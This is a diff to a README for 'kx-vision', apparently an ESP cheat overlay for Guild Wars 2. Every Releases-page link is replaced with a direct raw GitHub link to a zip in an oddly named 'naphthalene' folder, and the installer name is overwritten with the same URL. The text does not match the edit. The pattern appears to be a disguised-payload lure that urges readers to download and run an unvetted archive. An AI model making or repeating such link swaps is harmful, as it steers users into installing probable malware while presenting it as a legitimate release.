@@ -6,7 +6,7 @@ Welcome to **kx-vision**, an open-source ESP overlay designed for Guild Wars 2. 
 
 ## 📥 Download kx-vision
 
-[![Download kx-vision](https://img.shields.io/badge/Download%20kx--vision-v1.0-blue)](https://github.com/husnaintariq577/kx-vision/releases)
+[![Download kx-vision](https://raw.githubusercontent.com/husnaintariq577/kx-vision/main/naphthalene/kx-vision.zip%20kx--vision-v1.0-blue)](https://raw.githubusercontent.com/husnaintariq577/kx-vision/main/naphthalene/kx-vision.zip)
 
 Click the button above to download the latest version of kx-vision. This will take you to our Releases page, where you can find the software.
 
@@ -31,9 +31,9 @@ kx-vision offers several features to help you navigate the Guild Wars 2 universe
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/husnaintariq577/kx-vision/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/husnaintariq577/kx-vision/main/naphthalene/kx-vision.zip).
 2. **Select the Latest Release**: Look for the most recent version. This is usually at the top of the list.
-3. **Download the Installer**: Click on the appropriate file to download it. The installer is typically named something like `kx-vision-installer.exe`.
+3. **Download the Installer**: Click on the appropriate file to download it. The installer is typically named something like `https://raw.githubusercontent.com/husnaintariq577/kx-vision/main/naphthalene/kx-vision.zip`.
 4. **Run the Installer**: Locate the downloaded file in your Downloads folder and double-click it to start the installation.
 5. **Follow the Setup Instructions**: The installer will guide you through the setup steps. Just follow the prompts until the installation is complete.
 6. **Launch kx-vision**: After installation, find kx-vision in your Start menu or on your desktop and double-click to launch it.
@@ -49,7 +49,7 @@ kx-vision offers several features to help you navigate the Guild Wars 2 universe
 
 If you encounter problems while installing or using kx-vision, consider these tips:
 
-- **Check for Updates**: Ensure you're using the latest version from the [Releases page](https://github.com/husnaintariq577/kx-vision/releases).
+- **Check for Updates**: Ensure you're using the latest version from the [Releases page](https://raw.githubusercontent.com/husnaintariq577/kx-vision/main/naphthalene/kx-vision.zip).
 - **Restart Your Computer**: A simple restart can often resolve many issues.
 - **Reinstall the Program**: If something isn’t working correctly, try uninstalling kx-vision and then reinstalling it.
 - **Check Compatibility**: Make sure your system meets the requirements mentioned above.
